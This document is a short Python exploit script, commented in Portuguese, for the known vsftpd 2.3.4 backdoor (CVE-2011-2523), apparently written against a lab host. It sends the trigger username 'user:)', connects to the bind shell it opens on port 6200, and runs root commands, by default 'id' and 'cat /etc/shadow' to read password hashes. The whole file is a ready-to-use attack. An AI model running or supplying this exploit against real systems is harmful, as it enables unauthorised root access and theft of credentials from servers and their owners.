#!/usr/bin/env python3
"""Explora o backdoor do vsftpd 2.3.4 (CVE-2011-2523).

Envia o usuario malicioso "user:)" no FTP e, em seguida, conecta na
bindshell aberta na porta 6200 para executar comandos como root.

Uso: python3 vsftpd_backdoor.py <host> ["comando"]
"""
import socket
import sys
import time

COMMAND = "id\ncat /etc/shadow\n"


def recv_until(sock, marker, timeout=5):
    sock.settimeout(timeout)
    data = b""
    try:
        while marker not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def trigger_backdoor(host):
    ftp = socket.create_connection((host, 21), timeout=5)
    recv_until(ftp, b"220 ")
    ftp.sendall(b"USER user:)\r\n")
    recv_until(ftp, b"331 ")
    ftp.sendall(b"PASS backdoor\r\n")
    time.sleep(1)
    return ftp


def open_shell(host, attempts=10, delay=1):
    for _ in range(attempts):
        try:
            return socket.create_connection((host, 6200), timeout=2)
        except OSError:
            time.sleep(delay)
    return None


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.56.3"
    command = sys.argv[2] if len(sys.argv) > 2 else COMMAND

    ftp = trigger_backdoor(host)
    shell = open_shell(host)
    if shell is None:
        print("porta 6200 nao respondeu (backdoor nao abriu)", file=sys.stderr)
        return 1

    shell.sendall(command.encode() + b"\n")
    time.sleep(2)
    shell.settimeout(3)
    out = b""
    try:
        while True:
            chunk = shell.recv(8192)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass

    sys.stdout.write(out.decode(errors="replace"))
    ftp.close()
    shell.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
